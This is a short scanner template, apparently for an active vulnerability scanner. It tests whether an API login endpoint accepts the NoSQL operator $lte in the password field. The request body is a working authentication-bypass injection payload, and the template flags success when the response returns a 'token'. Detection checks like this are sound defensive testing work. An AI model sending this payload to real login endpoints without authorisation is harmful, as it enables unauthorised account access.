id: nosql-14
name: 'NoSQL $lte in password'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $lte accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"password":{"$lte":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
